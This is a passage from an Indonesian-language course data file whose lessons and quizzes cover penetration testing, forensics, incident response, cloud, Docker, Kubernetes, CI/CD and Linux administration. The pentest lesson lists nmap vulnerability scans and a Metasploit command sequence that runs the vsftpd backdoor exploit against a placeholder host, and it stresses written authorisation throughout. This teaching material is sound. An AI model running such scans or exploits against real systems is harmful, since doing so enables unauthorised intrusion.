      },
      {
        question: "Pertahanan paling efektif terhadap social engineering?",
        options: ["Firewall canggih", "Security awareness training rutin", "Mematikan email", "Password panjang"],
        answer: 1,
        explanation: "Training awareness rutin dengan simulasi phishing menurunkan risiko signifikan karena targetnya manusia."
      }
    ]
  },
  {
    level: 6,
    order: 12,
    title: "Penetration Testing Basics",
    slug: "penetration-testing-basics",
    description: "Metodologi pentest: recon, scanning, exploitation, reporting.",
    icon: "⚔️",
    isProject: false,
    content: `# Penetration Testing Basics

**Penetration Testing (pentest)** adalah simulasi serangan terhadap sistem dengan izin tertulis untuk menemukan kerentanan sebelum penyerang sesungguhnya melakukannya. Pentest legal dan terstruktur, berbeda dengan hacking ilegal.

## Fase Pentest (PTES)

\`\`\`text
1. Pre-engagement : scope, RoE, kontrak, izin tertulis
2. Reconnaissance : pengumpulan info target (OSINT)
3. Scanning        : enumerasi service & kerentanan
4. Exploitation    : eksploitasi kerentanan yang ditemukan
5. Post-exploit    : privilege escalation, lateral movement
6. Reporting       : dokumentasi temuan & rekomendasi
\`\`\`

## Reconnaissance (OSINT)

\`\`\`bash
# DNS enumeration
dig +short example.com A
dig +short example.com MX
dig +short example.com NS

# WHOIS info
whois example.com | grep -iE "registrant|name server"

# Subdomain discovery dengan Subfinder
subfinder -d example.com -silent | head -20
\`\`\`

## Scanning & Enumeration

\`\`\`bash
# Nmap: scan 1000 port paling umum + service detection
nmap -sV -sC -oN scan.txt example.com

# Scan full port TCP
nmap -p- -T4 example.com

# Vulnerability scan dengan Nmap scripts
nmap --script vuln example.com
\`\`\`

## Exploitation (Contoh Metasploit)

\`\`\`bash
# Contoh: exploit VSFTPD backdoor (ilustrasi)
msfconsole
msf> use exploit/unix/ftp/vsftpd_234_backdoor
msf> set RHOSTS target.example.com
msf> exploit
\`\`\`

> **WAJIB** hanya pada sistem yang sudah diberi izin tertulis oleh pemilik.

## Reporting

\`\`\`text
Struktur laporan pentest:
1. Executive Summary (untuk management)
2. Scope & Methodology
3. Findings (per kerentanan):
   - Title, severity (CVSS), description
   - Steps to reproduce (POC)
   - Impact
   - Remediation recommendation
4. Appendix: tools, raw output
\`\`\`

## Klasifikasi Severity (CVSS)

\`\`\`text
Critical : 9.0-10.0  (RCE, SQLi dengan data sensitif)
High     : 7.0-8.9   (privilege escalation, auth bypass)
Medium   : 4.0-6.9   (XSS reflected, info disclosure)
Low      : 0.1-3.9   (missing header, verbose error)
\`\`\`

> Pentest berkualitas tidak diukur dari jumlah temuan, tetapi dari **risk reduction** yang diberikan ke klien.`,
    quiz: [
      {
        question: "Fase pertama dalam pentest menurut PTES?",
        options: ["Exploitation", "Pre-engagement & izin tertulis", "Reporting", "Scanning"],
        answer: 1,
        explanation: "Pre-engagement (scope, RoE, izin tertulis) adalah fase pertama yang mendefinisikan batasan legalitas."
      },
      {
        question: "Tool untuk network scanning dan service detection?",
        options: ["Nmap", "Burp Suite", "Metasploit", "John the Ripper"],
        answer: 0,
        explanation: "Nmap adalah tool standar untuk port scanning dan service detection."
      },
      {
        question: "Severity Critical berdasarkan CVSS berada di rentang?",
        options: ["0.1-3.9", "4.0-6.9", "7.0-8.9", "9.0-10.0"],
        answer: 3,
        explanation: "Critical severity adalah skor CVSS 9.0-10.0 (misalnya RCE)."
      }
    ]
  },
  {
    level: 6,
    order: 13,
    title: "Digital Forensics",
    slug: "digital-forensics",
    description: "Investigasi bukti digital, chain of custody, dan forensic tools.",
    icon: "🔍",
    isProject: false,
    content: `# Digital Forensics

**Digital Forensics** adalah proses pengumpulan, pengamanan, analisis, dan presentasi bukti digital untuk keperluan investigasi insiden atau proses hukum. Tujuannya mengungkap *apa, kapan, di mana, oleh siapa, dan bagaimana* insiden terjadi.

## Prinsip Utama Forensik

\`\`\`text
1. Jangan mengubah bukti asli (kerja di copy)
2. Dokumentasi setiap langkah (chain of custody)
3. Tool yang teruji & dapat diverifikasi
4. Reproducibility: orang lain harus bisa mendapat hasil sama
5. Integritas: hash MD5/SHA-256 sebelum & sesudah analisis
\`\`\`

## Chain of Custody

Dokumen yang melacak perpindahan bukti dari pengumpulan hingga presentasi pengadilan:

\`\`\`text
Item        : Harddisk Seagate 1TB SN:ABC123
Dikumpulkan : 2024-06-15 09:30 WIB oleh Andi (Forensic Analyst)
Diserahkan  : 2024-06-15 14:00 WIB ke Lab Forensik
Diterima    : 2024-06-15 14:15 WIB oleh Budi (Lab Tech)
Hash SHA256 : a3f5e9... (sebelum & sesudah imaging)
\`\`\`

## Forensic Imaging

Membuat copy bit-by-bit dari storage untuk dianalisis tanpa menyentuh asli:

\`\`\`bash
# Imaging dengan dd (Linux)
sudo dd if=/dev/sdb of=disk_image.dd bs=4M conv=sync,noerror status=progress

# Imaging dengan dcfldd (dengan hash otomatis)
sudo dcfldd if=/dev/sdb of=disk_image.dd hash=sha256,md5 hashwindow=0 bs=4M

# Verifikasi integritas image
sha256sum disk_image.dd
\`\`\`

## Analisis Bukti

\`\`\`bash
# Timeline analysis dengan log2timeline / mactime (SIFT/Plaso)
log2timeline.py timeline.plaso disk_image.dd
psort.py -o l2tcsv -w timeline.csv timeline.plaso

# Recover file yang terhapus dengan foremost
foremost -t all -i disk_image.dd -o recovered/

# Analyze memory dump dengan Volatility
volatility -f memory.dmp windows.pslist
volatility -f memory.dmp windows.netscan
\`\`\`

## Tool Forensik Populer

\`\`\`text
- Autopsy / Sleuth Kit   : analisis disk image GUI
- Volatility             : memory forensics
- Wireshark              : network forensics (pcap)
- Plaso (log2timeline)   : super timeline
- FTK Imager             : imaging Windows
- EnCase                 : commercial forensic suite
- Kali Linux Forensic    : distro dengan tools lengkap
\`\`\`

> Bukti digital sangat rapuh — satu perubahan bisa membuatnya **tidak diterima pengadilan**. Selalu kerja di image, bukan di aslinya.`,
    quiz: [
      {
        question: "Prinsip utama digital forensics?",
        options: ["Mengubah bukti asli", "Kerja pada copy, jangan sentuh asli", "Mematikan tools hash", "Format ulang disk"],
        answer: 1,
        explanation: "Forensik bekerja pada copy/image agar bukti asli tidak berubah dan tetap admissible."
      },
      {
        question: "Tool untuk memory forensics?",
        options: ["Volatility", "Nmap", "Burp Suite", "Jenkins"],
        answer: 0,
        explanation: "Volatility adalah framework memory forensics untuk analisis RAM dump."
      },
      {
        question: "Apa itu chain of custody?",
        options: ["Rantai alat forensik", "Pelacakan perpindahan bukti digital", "Rantai network switch", "Log akses fisik"],
        answer: 1,
        explanation: "Chain of custody adalah dokumentasi yang melacak perpindahan bukti dari pengumpulan hingga pengadilan."
      }
    ]
  },
  {
    level: 6,
    order: 14,
    title: "Incident Response",
    slug: "incident-response",
    description: "Prosedur menanggapi insiden keamanan: detect, contain, eradicate, recover.",
    icon: "🚨",
    isProject: false,
    content: `# Incident Response

**Incident Response (IR)** adalah proses terstruktur menanggapi insiden keamanan untuk meminimalkan kerusakan, biaya, dan waktu pemulihan. Tanpa IR plan yang baik, organisasi panik saat krisis dan mengambil keputusan yang memperburuk situasi.

## Siklus NIST IR (SP 800-61)

\`\`\`text
1. Preparation       : siapkan tim, tool, playbook, kontak
2. Detection & Analysis : identifikasi insiden dari alert/log
3. Containment       : isolasi untuk hentikan penyebaran
4. Eradication       : hapus root cause (malware, akun backdoor)
5. Recovery          : restore service, validasi bersih
6. Post-Incident     : lessons learned, improve defense
\`\`\`

## Preparation: Playbook

\`\`\`text
Tim IR harus punya playbook untuk:
- Ransomware attack
- Phishing / email compromise
- Data breach / exfiltration
- DDoS attack
- Insider threat
- Web defacement
- Lost/stolen device
Setiap playbook: langkah, owner, SLA, komunikasi
\`\`\`

## Detection & Analysis

\`\`\`bash
# Cek log auth Linux untuk indikasi brute force
sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' \\
  | sort | uniq -c | sort -nr | head -10

# Cek koneksi outbound mencurigakan
sudo ss -tunap state established | awk '{print $5}' | cut -d: -f1 | sort -u

# Cek file yang dimodifikasi 24 jam terakhir (web root)
sudo find /var/www -type f -mtime -1 -ls
\`\`\`

## Containment Strategy

\`\`\`text
Short-term containment:
- Isolate host dari network (VLAN quarantine)
- Disable akun terkompromi
- Block IP C2 di firewall
- Snapshot VM untuk forensik

Long-term containment:
- Patch temporary (hotfix)
- Reset credential yang terdampak
- Tambah rule WAF/EDR
\`\`\`

## Komunikasi Krisis

\`\`\`text
Internal : incident commander, exec, legal, HR, IT
Eksternal : klien (jika data mereka terdampak), regulator (OJK/ Komdigi),
            penegak hukum (Bareskrim Cyber), publik (jika wajib disclose)
Aturan: jangan spekulasi, pakai fakta, konsisten
\`\`\`

## Post-Incident Review

\`\`\`text
Pertanyaan kunci:
- Apa yang terjadi? (timeline detail)
- Bagaimana kita mendeteksinya?
- Berapa lama dari kompromi ke deteksi (MTTD)?
- Berapa lama dari deteksi ke recovery (MTTR)?
- Apa yang bisa diperbaiki?
- Tindakan follow-up & owner
\`\`\`

> MTD dan MTTR adalah metrik IR paling penting. Tujuan: deteksi cepat, isolasi cepat, recovery terstruktur. **Practice makes perfect — lakukan tabletop exercise berkala.**`,
    quiz: [
      {
        question: "Fase pertama siklus NIST Incident Response?",
        options: ["Containment", "Preparation", "Recovery", "Eradication"],
        answer: 1,
        explanation: "Preparation adalah fase pertama: menyiapkan tim, tool, playbook, dan kontak sebelum insiden terjadi."
      },
      {
        question: "MTTD adalah singkatan dari?",
        options: ["Mean Time To Detect", "Maximum Time To Deploy", "Mean Time To Decrypt", "Minimum Time To Data"],
        answer: 0,
        explanation: "MTTD (Mean Time To Detect) = rata-rata waktu dari kompromi hingga insiden terdeteksi."
      },
      {
        question: "Apa yang dilakukan di fase containment?",
        options: ["Menghapus malware", "Mengisolasi host & menghentikan penyebaran", "Restore backup", "Laporan ke polisi"],
        answer: 1,
        explanation: "Containment mengisolasi host/akun yang terdampak untuk mencegah penyebaran insiden."
      }
    ]
  },

  // ==================== LEVEL 7 - CLOUD & DEVOPS (8) ====================
  {
    level: 7,
    order: 1,
    title: "Cloud Computing Basics",
    slug: "cloud-computing-basics",
    description: "IaaS, PaaS, SaaS, public/private/hybrid cloud.",
    icon: "☁️",
    isProject: false,
    content: `# Cloud Computing Basics

**Cloud computing** adalah model penyediaan resource komputasi (server, storage, database, networking, software) lewat internet dengan pembayaran pay-as-you-go. Cloud menghapus kebutuhan capex besar untuk hardware fisik.

## Model Layanan Cloud

\`\`\`text
IaaS (Infrastructure as a Service)
  -> Anda kelola: OS, app, data
  -> Provider kelola: virtualization, server, storage, network
  -> Contoh: AWS EC2, Google Compute Engine, Azure VM

PaaS (Platform as a Service)
  -> Anda kelola: app, data
  -> Provider kelola: runtime, OS, infra
  -> Contoh: Heroku, Google App Engine, AWS Elastic Beanstalk

SaaS (Software as a Service)
  -> Provider kelola semua, Anda pakai saja
  -> Contoh: Gmail, Office 365, Salesforce, Notion

FaaS (Function as a Service / Serverless)
  -> Anda tulis function, sisanya provider
  -> Contoh: AWS Lambda, Cloud Functions, Azure Functions
\`\`\`

## Jenis Deployment Cloud

\`\`\`text
Public Cloud   : AWS, GCP, Azure (infra dibagi banyak tenant)
Private Cloud  : infra khusus organisasi (on-prem atau dedicated)
Hybrid Cloud   : kombinasi public + private, workload berpindah
Multi-Cloud    : pakai beberapa public cloud sekaligus
\`\`\`

## Karakteristik Cloud (NIST)

\`\`\`text
1. On-demand self-service
2. Broad network access
3. Resource pooling (multi-tenant)
4. Rapid elasticity (scale up/down otomatis)
5. Measured service (bayar sesuai pakai)
\`\`\`

## Menghitung Biaya

\`\`\`bash
# AWS CLI: estimasi biaya EC2 bulanan
aws pricing get-products \\
  --service-code AmazonEC2 \\
  --filters Type=TERM_MATCH,Field=instanceType,Value=t3.micro \\
  --region us-east-1 \\
  --query 'PriceLists[0]' --output text | jq '.terms.OnDemand | .[] | .priceDimensions | .[] | .pricePerUnit.USD'
\`\`\`

## Shared Responsibility Model

\`\`\`text
Responsibility        IaaS    PaaS    SaaS
-------------------------------------------
Data                  Anda    Anda    Anda
Identity & Access     Anda    Anda    Anda
Application           Anda    Anda    Provider
OS                    Anda    Provider Provider
Network/firewall      Anda    Provider Provider
Host/Infra            Provider Provider Provider
Physical security     Provider Provider Provider
\`\`\`

> Cloud bukan "orang lain yang mengamankan sistem Anda". Tanggung jawab security **terbagi** — pahami batasnya.`,
    quiz: [
      {
        question: "Model cloud di mana provider mengelola OS dan runtime, Anda hanya fokus app?",
        options: ["IaaS", "PaaS", "SaaS", "On-premise"],
        answer: 1,
        explanation: "PaaS mengelola runtime, OS, dan infra sehingga developer fokus pada aplikasi dan data."
      },
      {
        question: "Contoh layanan SaaS?",
        options: ["AWS EC2", "Google App Engine", "Gmail", "Microsoft Hyper-V"],
        answer: 2,
        explanation: "Gmail adalah SaaS — provider mengelola seluruh stack, user hanya memakai aplikasi."
      },
      {
        question: "Model cloud yang menggabungkan public dan private cloud?",
        options: ["Public Cloud", "Private Cloud", "Hybrid Cloud", "Single Cloud"],
        answer: 2,
        explanation: "Hybrid Cloud menggabungkan public dan private cloud, memungkinkan workload berpindah sesuai kebutuhan."
      }
    ]
  },
  {
    level: 7,
    order: 2,
    title: "AWS & Cloud Services",
    slug: "aws-cloud-services",
    description: "AWS EC2, S3, RDS, Lambda, dan layanan cloud populer.",
    icon: "🟧",
    isProject: false,
    content: `# AWS & Cloud Services

**Amazon Web Services (AWS)** adalah platform cloud terbesar dengan 200+ layanan. Memahami layanan inti AWS penting untuk membangun aplikasi scalable dan resilient.

## Layanan Inti AWS

\`\`\`text
Compute      : EC2 (VM), Lambda (serverless), ECS/EKS (container)
Storage      : S3 (object), EBS (block), EFS (file), Glacier (archive)
Database     : RDS (SQL managed), DynamoDB (NoSQL), ElastiCache (cache)
Networking   : VPC, Route53 (DNS), CloudFront (CDN), ELB (load balancer)
Security     : IAM, KMS (key mgmt), WAF, GuardDuty (threat detect)
Monitoring   : CloudWatch, CloudTrail (audit), X-Ray (tracing)
\`\`\`

## Amazon S3: Object Storage

\`\`\`bash
# Buat bucket S3
aws s3 mb s3://my-app-backup-2024

# Upload file
aws s3 cp backup.tar.gz s3://my-app-backup-2024/

# List isi bucket
aws s3 ls s3://my-app-backup-2024/

# Sync folder lokal ke S3
aws s3 sync ./local-folder s3://my-app-backup-2024/ --delete

# Set bucket policy public-read (hati-hati!)
aws s3api put-bucket-policy --bucket my-app-backup-2024 --policy file://policy.json
\`\`\`

## Amazon EC2: Virtual Machine

\`\`\`bash
# Launch instance dengan Amazon Linux 2023
aws ec2 run-instances \\
  --image-id ami-0abcdef1234567890 \\
  --instance-type t3.micro \\
  --key-name my-keypair \\
  --security-group-ids sg-12345 \\
  --subnet-id subnet-12345

# List instance
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress]' --output table
\`\`\`

## AWS Lambda: Serverless Function

\`\`\`python
# Lambda function: greeting sederhana
import json

def lambda_handler(event, context):
    name = event.get('name', 'World')
    return {
        'statusCode': 200,
        'body': json.dumps({'message': f'Hello, {name}!'})
    }
\`\`\`

## RDS: Managed Database

\`\`\`bash
# Buat PostgreSQL RDS instance
aws rds create-db-instance \\
  --db-instance-identifier mydb \\
  --db-instance-class db.t3.micro \\
  --engine postgres \\
  --master-username admin \\
  --master-user-password 'Str0ngP@ss!' \\
  --allocated-storage 20
\`\`\`

## Well-Architected Framework

\`\`\`text
6 Pilar AWS Well-Architected:
1. Operational Excellence
2. Security
3. Reliability
4. Performance Efficiency
5. Cost Optimization
6. Sustainability
\`\`\`

> Sebelum memilih layanan, mulai dari kebutuhan bisnis, bukan dari teknologi. **S3 untuk file, RDS untuk data relasional, Lambda untuk event-driven**.`,
    quiz: [
      {
        question: "Layanan AWS untuk object storage?",
        options: ["EC2", "S3", "RDS", "VPC"],
        answer: 1,
        explanation: "Amazon S3 (Simple Storage Service) adalah object storage untuk file, backup, dan static hosting."
      },
      {
        question: "AWS Lambda adalah contoh model cloud?",
        options: ["IaaS", "PaaS", "SaaS", "FaaS/Serverless"],
        answer: 3,
        explanation: "Lambda adalah FaaS/Serverless — Anda hanya menulis function, AWS mengelola sisanya."
      },
      {
        question: "Layanan AWS untuk managed relational database?",
        options: ["DynamoDB", "RDS", "S3", "ElastiCache"],
        answer: 1,
        explanation: "Amazon RDS menyediakan managed relational database (MySQL, PostgreSQL, dll)."
      }
    ]
  },
  {
    level: 7,
    order: 3,
    title: "Docker & Containerization",
    slug: "docker-containerization",
    description: "Docker image, container, Dockerfile, dan docker-compose.",
    icon: "🐳",
    isProject: false,
    content: `# Docker & Containerization

**Docker** adalah platform containerization yang mengemas aplikasi beserta dependensinya menjadi satu unit portabel. Container lebih ringan dari VM karena berbagi kernel host.

## Konsep Dasar

\`\`\`text
Image      : blueprint read-only berisi app + dependency
Container  : instance running dari image
Dockerfile : script deklaratif untuk build image
Volume     : persistent storage untuk container
Network    : virtual network antar container
Registry   : tempat simpan/distribusi image (Docker Hub, ECR)
\`\`\`

## Dockerfile

\`\`\`dockerfile
# Multi-stage build: Node.js app
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
RUN npm run build

FROM node:20-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder /app/node_modules ./node_modules
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/package.json ./
EXPOSE 3000
CMD ["node", "dist/server.js"]
\`\`\`

## Perintah Dasar

\`\`\`bash
# Build image
docker build -t myapp:1.0 .

# Run container dengan port mapping & env
docker run -d --name web -p 3000:3000 -e NODE_ENV=production myapp:1.0

# List container berjalan
docker ps

# Masuk ke container untuk debugging
docker exec -it web sh

# Lihat log
docker logs -f web

# Hapus container & image
docker rm -f web
docker rmi myapp:1.0
\`\`\`

## Docker Compose

Orkestrasi multi-container untuk development & small production:

\`\`\`yaml
# docker-compose.yml
version: "3.9"
services:
  web:
    build: .
    ports:
      - "3000:3000"
    environment:
      - DATABASE_URL=postgres://app:secret@db:5432/app
    depends_on:
      - db
  db:
    image: postgres:16-alpine
    environment:
      - POSTGRES_USER=app
      - POSTGRES_PASSWORD=secret
      - POSTGRES_DB=app
    volumes:
      - pgdata:/var/lib/postgresql/data
volumes:
  pgdata:
\`\`\`

\`\`\`bash
# Jalankan seluruh stack
docker compose up -d
docker compose logs -f web
docker compose down
\`\`\`

## Best Practices

\`\`\`text
- Pakai image official & Alpine untuk ukuran kecil
- Multi-stage build untuk image minimal
- Jangan run sebagai root dalam container
- Gunakan .dockerignore (exclude node_modules, .git)
- Pin versi tag (jangan :latest di production)
- Scan image dengan Trivy/Grype untuk CVE
- Hanya simpan config di env, bukan hardcode
\`\`\`

> Container immutable: build sekali, jalankan di mana saja. **Build once, run anywhere** — itu kekuatan utama Docker.`,
    quiz: [
      {
        question: "Perbedaan image dan container di Docker?",
        options: ["Sama saja", "Image blueprint, container instance running", "Container blueprint, image running", "Image adalah registry"],
        answer: 1,
        explanation: "Image adalah blueprint read-only, sedangkan container adalah instance yang sedang berjalan dari image."
      },
      {
        question: "File deklaratif untuk membangun Docker image?",
        options: ["docker-compose.yml", "Dockerfile", "package.json", "Makefile"],
        answer: 1,
        explanation: "Dockerfile berisi instruksi langkah demi langkah untuk membangun image Docker."
      },
      {
        question: "Tool untuk orchestration multi-container di development?",
        options: ["Docker Compose", "kubectl", "Helm", "Terraform"],
        answer: 0,
        explanation: "Docker Compose mengelola multi-container dengan satu file YAML untuk development & small production."
      }
    ]
  },
  {
    level: 7,
    order: 4,
    title: "Kubernetes Orchestration",
    slug: "kubernetes-orchestration",
    description: "Pod, deployment, service, dan orchestration dengan K8s.",
    icon: "⎈",
    isProject: false,
    content: `# Kubernetes Orchestration

**Kubernetes (K8s)** adalah platform orchestration container open-source yang mengotomasi deployment, scaling, dan manajemen aplikasi containerized. K8s menjadi standar industri untuk production-grade container orchestration.

## Konsep Inti K8s

\`\`\`text
Cluster      : sekumpulan node (control plane + worker nodes)
Pod          : unit terkecil, berisi 1+ container yang share network & storage
Deployment   : mendefinisikan replica pods & strategi update
Service      : abstraksi network yang stable (IP/DNS) untuk pods
ConfigMap    : konfigurasi sebagai key-value (non-sensitive)
Secret       : konfigurasi sensitive (base64 encoded)
Ingress      : HTTP/HTTPS routing dari luar cluster
Namespace    : virtual cluster untuk isolasi resource
\`\`\`

## Deployment YAML

\`\`\`yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
  labels:
    app: web
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: web
        image: myapp:1.0
        ports:
        - containerPort: 3000
        resources:
          requests:
            cpu: "100m"
            memory: "128Mi"
          limits:
            cpu: "500m"
            memory: "512Mi"
        env:
        - name: DATABASE_URL
          valueFrom:
            secretKeyRef:
              name: app-secret
              key: database-url
\`\`\`

## Service YAML

\`\`\`yaml
# service.yaml
apiVersion: v1
kind: Service
metadata:
  name: web-service
spec:
  type: LoadBalancer
  selector:
    app: web
  ports:
  - port: 80
    targetPort: 3000
\`\`\`

## Perintah kubectl

\`\`\`bash
# Apply manifest
kubectl apply -f deployment.yaml
kubectl apply -f service.yaml

# Cek pods, services, deployments
kubectl get pods -o wide
kubectl get svc
kubectl get deployments

# Logs pod
kubectl logs -f deployment/web-app

# Exec ke pod
kubectl exec -it pod/web-app-xxx -- sh

# Scale deployment
kubectl scale deployment web-app --replicas=5

# Rolling update
kubectl set image deployment/web-app web=myapp:2.0
kubectl rollout status deployment/web-app

# Rollback jika gagal
kubectl rollout undo deployment/web-app
\`\`\`

## Auto-scaling

\`\`\`bash
# Horizontal Pod Autoscaler berdasarkan CPU
kubectl autoscale deployment web-app \\
  --cpu-percent=70 \\
  --min=3 --max=20

# Cek HPA
kubectl get hpa
\`\`\`

## Best Practices

\`\`\`text
- Definisikan resource requests & limits
- Gunakan livenessProbe & readinessProbe
- Jangan run container sebagai root
- Pakai Namespace untuk isolasi environment
- GitOps dengan ArgoCD/Flux untuk declarative deploy
- Define PodDisruptionBudget untuk HA
- Scan image untuk CVE sebelum deploy
- Pakai Helm atau Kustomize untuk template
\`\`\`

> Kubernetes powerful tapi kompleks. Untuk workload kecil, **Docker Swarm atau managed K8s (EKS/GKE/AKS)** lebih hemat waktu daripada self-hosted.`,
    quiz: [
      {
        question: "Unit terkecil di Kubernetes?",
        options: ["Container", "Pod", "Node", "Deployment"],
        answer: 1,
        explanation: "Pod adalah unit terkecil di K8s, berisi satu atau lebih container yang share network & storage."
      },
      {
        question: "Resource K8s untuk konfigurasi sensitive?",
        options: ["ConfigMap", "Secret", "Volume", "Service"],
        answer: 1,
        explanation: "Secret menyimpan data sensitif (password, token) dalam bentuk base64 encoded."
      },
      {
        question: "Perintah untuk scale deployment ke 5 replica?",
        options: ["kubectl scale deployment web-app --replicas=5", "kubectl resize web-app 5", "kubectl add pods web-app 5", "docker scale web-app 5"],
        answer: 0,
        explanation: "kubectl scale deployment <name> --replicas=N mengubah jumlah replica pod."
      }
    ]
  },
  {
    level: 7,
    order: 5,
    title: "CI/CD Pipeline",
    slug: "ci-cd-pipeline",
    description: "Continuous Integration/Deployment dengan GitHub Actions dan Jenkins.",
    icon: "🔄",
    isProject: false,
    content: `# CI/CD Pipeline

**CI/CD** (Continuous Integration / Continuous Deployment) adalah praktik otomasi build, test, dan deployment setiap perubahan kode. CI/CD menghilangkan deploy manual yang rentan error dan mempercepat release dari minggu menjadi menit.

## Konsep

\`\`\`text
CI (Continuous Integration)
  -> Setiap push/merge trigger: build, lint, test
  -> Deteksi bug sedini mungkin
  -> Merge ke main selalu green & deployable

CD (Continuous Delivery)
  -> Setiap build yang lulus siap deploy ke staging/prod
  -> Deploy masih manual click/button

CD (Continuous Deployment)
  -> Setiap build yang lulus auto-deploy ke production
  -> Tanpa intervensi manual
\`\`\`

## GitHub Actions Workflow

\`\`\`yaml
# .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm run lint
      - run: npm run test:unit
      - run: npm run build

  build-push:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v5
        with:
          push: true
          tags: ghcr.io/\${{ github.repository }}:latest

  deploy:
    needs: build-push
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: echo "Deploying to production..."
\`\`\`

## Pipeline Stages Best Practice

\`\`\`text
1. Source      : trigger dari git event
2. Build       : compile, install dependency
3. Test        : unit, integration, e2e, security scan
4. Package     : build Docker image, push ke registry
5. Deploy Staging : auto setelah test lulus
6. Approval    : manual gate untuk production
7. Deploy Prod : blue-green atau canary
8. Verify      : smoke test, health check post-deploy
9. Notify      : Slack/Teams notification
\`\`\`

## Strategi Deployment

\`\`\`text
Rolling Update  : ganti pods lama dengan baru bertahap
Blue-Green      : 2 env identik, switch traffic sekaligus
Canary          : rilis ke sebagian user, monitor, scale up
Feature Flag    : aktifkan fitur per-user tanpa deploy ulang
Recreate        : stop semua lama, start baru (downtime)
\`\`\`

## Tool Populer

\`\`\`text
- GitHub Actions  : CI/CD native GitHub, YAML-based
- GitLab CI       : mirip GH Actions, built-in di GitLab
- Jenkins         : veteran, plugin rich, self-hosted
- CircleCI        : cloud-native, fast
- ArgoCD          : GitOps untuk Kubernetes
- Tekton          : Kubernetes-native CI/CD
\`\`\`

> CI/CD bukan tentang cepat — itu tentang **aman berubah**. Setiap commit yang lulus CI seharusnya layak production.`,
    quiz: [
      {
        question: "Apa beda Continuous Delivery dan Continuous Deployment?",
        options: ["Sama saja", "Delivery manual deploy, Deployment otomatis", "Delivery untuk backend, Deployment frontend", "Deployment lebih lama"],
        answer: 1,
        explanation: "Continuous Delivery siap deploy tapi manual, Continuous Deployment auto-deploy setiap build yang lulus."
      },
      {
        question: "Strategi deploy yang merilis ke sebagian user dulu?",
        options: ["Rolling Update", "Blue-Green", "Canary", "Recreate"],
        answer: 2,
        explanation: "Canary deployment merilis ke persentase kecil user, monitor, lalu scale up bertahap."
      },
      {
        question: "File yang mendefinisikan workflow GitHub Actions?",
        options: ["Jenkinsfile", ".github/workflows/*.yml", "Dockerfile", "package.json"],
        answer: 1,
        explanation: "Workflow GitHub Actions didefinisikan dalam YAML di folder .github/workflows/."
      }
    ]
  },
  {
    level: 7,
    order: 6,
    title: "Linux Server Administration",
    slug: "linux-server-administration",
    description: "SSH, user management, cron, systemctl, dan server hardening.",
    icon: "🐧",
    isProject: false,
    content: `# Linux Server Administration

Linux adalah OS dominan untuk server production. Kemampuan administrasi Linux — dari manajemen user hingga hardening — adalah skill wajib DevOps/SRE.

## SSH: Remote Access Aman

\`\`\`bash
# Generate SSH keypair (Ed25519, modern & aman)
ssh-keygen -t ed25519 -C "admin@server" -f ~/.ssh/server_key

# Copy public key ke remote server
ssh-copy-id -i ~/.ssh/server_key.pub user@server.example.com

# Connect dengan key
ssh -i ~/.ssh/server_key user@server.example.com

# Disable password login (di /etc/ssh/sshd_config)
# PasswordAuthentication no
# PubkeyAuthentication yes
sudo systemctl restart sshd
\`\`\`

## User Management

\`\`\`bash
# Tambah user baru
sudo useradd -m -s /bin/bash budi
sudo passwd budi

# Tambah user ke grup sudo
sudo usermod -aG sudo budi

# Hapus user beserta home directory
sudo userdel -r budi

# List user & grup
cut -d: -f1 /etc/passwd
groups budi
\`\`\`

## Systemd: Service Management

\`\`\`bash
# Start/stop/restart service
sudo systemctl start nginx
sudo systemctl stop nginx
sudo systemctl restart nginx
sudo systemctl reload nginx

# Enable service auto-start saat boot
sudo systemctl enable nginx
sudo systemctl disable nginx

# Cek status & log
sudo systemctl status nginx
sudo journalctl -u nginx -f
sudo journalctl -u nginx --since "1 hour ago"
\`\`\`

## Cron: Job Terjadwal

\`\`\`bash
# Edit crontab user
crontab -e

# Format: menit jam tanggal bulan hari command
# Contoh: backup setiap hari 02:00
0 2 * * * /opt/scripts/backup.sh >> /var/log/backup.log 2>&1

# Setiap 5 menit
*/5 * * * * /opt/scripts/health-check.sh

# Setiap Senin jam 9 pagi
0 9 * * 1 /opt/scripts/weekly-report.sh

# List cron user
crontab -l
\`\`\`

## Server Hardening

\`\`\`bash
# Update sistem
sudo apt update && sudo apt upgrade -y

# Setup firewall UFW
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp     # SSH
sudo ufw allow 80/tcp     # HTTP
sudo ufw allow 443/tcp    # HTTPS
sudo ufw enable

# Disable root login via SSH
# (di sshd_config: PermitRootLogin no)

# Install fail2ban (ban IP brute force)
sudo apt install fail2ban -y
sudo systemctl enable fail2ban

# Setup automatic security updates
sudo apt install unattended-upgrades -y
sudo dpkg-reconfigure -plow unattended-upgrades
\`\`\`

## Monitoring Resource

\`\`\`bash
# CPU & memory real-time
htop
free -h
df -h

# Network connection
ss -tunap

# Process yang paling boros resource
ps aux --sort=-%mem | head -10
ps aux --sort=-%cpu | head -10
\`\`\`

> Server yang baik adalah yang **bos Anda lupa ada**. Otomasi patching, monitoring, dan alerting yang tepat menjadikan sysadmin hidup tenang.`,
    quiz: [
      {
        question: "Algoritma SSH key modern yang direkomendasikan?",
        options: ["RSA 1024", "DSA", "Ed25519", "ECDSA"],
        answer: 2,
        explanation: "Ed25519 adalah algoritma modern yang lebih aman dan cepat dengan key lebih pendek."
      },
      {
        question: "Perintah systemd untuk auto-start service saat boot?",
